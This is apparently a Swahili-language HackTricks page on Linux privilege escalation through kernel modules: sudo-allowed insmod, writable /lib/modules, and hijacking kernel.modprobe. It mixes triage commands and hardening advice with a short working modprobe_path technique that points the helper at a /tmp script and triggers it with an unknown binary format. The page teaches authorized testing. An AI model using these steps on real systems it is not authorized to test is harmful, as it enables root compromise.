# Kernel Modules na modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Misconfiguration za kernel module na module-loading

Msaada wa kernel module ni eneo lenye athari kubwa wakati wa kufanya ukaguzi wa Linux privilege escalation. Usichukulie kila ujumbe wa unsigned-module kuwa exploitable peke yake, bali uitumie kujibu maswali ya kiutendaji:

- Je, user wa sasa anaweza kupakia modules kupitia `sudo`, capabilities, au helper path inayoweza kuandikwa?
- Je, module loading bado imewezeshwa?
- Je, module signature enforcement imezimwa?
- Je, module directories au module files zinaweza kuandikwa?
- Je, kernel logs zinaweza kusomwa ili kuthibitisha kilichotokea?

Quick triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Ufafanuzi:

- `modules_disabled=1` inamaanisha modules mpya haziwezi kupakiwa hadi kuwashwa upya.
- `module_sig_enforce=1` kwa kawaida huzuia modules zisizo na sahihi.
- `dmesg_restrict=0` huwawezesha users wasio na privileges kusoma kernel logs kwenye systems nyingi.
- Njia zinazoandikika chini ya `/lib/modules/$(uname -r)/` ni hatari kwa sababu module discovery na auto-loading vinaweza kuamini tree hiyo.

### Kupakia module na kusoma kernel output

Ikiwa una ruhusa halali ya kupakia local module, `insmod` huingiza faili halisi ya `.ko` unayotoa. Init function ya module huendeshwa mara moja, na messages zinazoandikwa kwa `printk()` huonekana kwenye kernel logs.

Minimal workflow kwa review au lab environments:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ikiwa `sudo -l` inaruhusu `insmod`, `modprobe`, au wrapper inayozizunguka, ichukulie kuwa critical:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` Inayoruhusiwa na Sudo

Sheria ya sudo inayomruhusu mtumiaji kuendesha `insmod` haiwezi kulinganishwa na kuruhusu helper wa kawaida wa kiutawala. Code ya uanzishaji ya module huendeshwa katika kernel context mara tu `.ko` inapowekwa, hivyo swali muhimu la ukaguzi ni: "je, mtumiaji huyu anaweza kuchagua au kurekebisha module inayopakiwa?"

Mtiririko wa jumla wa ukaguzi:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ikiwa mtumiaji anaweza kutoa faili ya kiholela ya `.ko`, kanuni hiyo inapaswa kuchukuliwa kama compromise kamili ya mfumo katika tathmini iliyoidhinishwa. Muundo salama zaidi wa kiutendaji ni kuepuka kukabidhi upakiaji wa module kupitia sudo; ikiwa haiwezi kuepukika, weka vikwazo kwa path halisi, umiliki, permissions, sera ya signing, na utaratibu wa kuiondoa.

Kwa muundo salama wa kujenga module katika lab inayodhibitiwa, source ndogo na Makefile huonekana hivi:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Jenga na pakia katika maabara iliyoidhinishwa pekee:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Ukaguzi wa matumizi mabaya ya `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` hudhibiti userspace helper ambayo kernel huiita inapohitaji msaada wa kupakia module. Ikiwa attacker anaweza kuibadilisha iwe path ya executable inayoweza kuandikwa na kisha kuanzisha unknown binary format au njia nyingine ya kuomba module, inaweza kusababisha root code execution.

Angalia helper ya sasa:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Angalia ikiwa unaweza kuiathiri:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Muundo wa jumla wa maabara pekee:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Kwenye mifumo iliyoimarishwa, hii inapaswa kushindwa kwa sababu watumiaji wasio na privilege hawawezi kuandika kwenye `kernel.modprobe`, njia ya helper haiwezi kuandikwa, au njia za kupakia modules zimezuiwa.

### Ukaguzi wa `/lib/modules` zinazoweza kuandikwa

Directories za modules zinazoweza kuandikwa zinaweza kuruhusu kubadilishwa kwa modules, kupandikizwa kwa modules hasidi, au matumizi mabaya ya auto-load kulingana na jinsi `modprobe` itakavyoitwa baadaye.

Kagua locations zinazoweza kuandikwa:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ikiwa utapata maudhui ya module yenye ruhusa ya kuandikwa, kagua jinsi modules zinavyogunduliwa:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Maelezo ya kiulinzi:

- Weka `/lib/modules` ikiwa inamilikiwa na `root:root` na haiwezi kuandikwa na users.
- Weka `kernel.modules_disabled=1` baada ya kuwasha mfumo, pale ambapo hilo linawezekana kiutendaji.
- Tekeleza module signing kwenye systems zinazohitaji modules zinazoweza kupakiwa.
- Fuatilia uandishi kwenye `/proc/sys/kernel/modprobe`, `/lib/modules`, pamoja na utekelezaji usiotarajiwa wa `insmod`/`modprobe`.
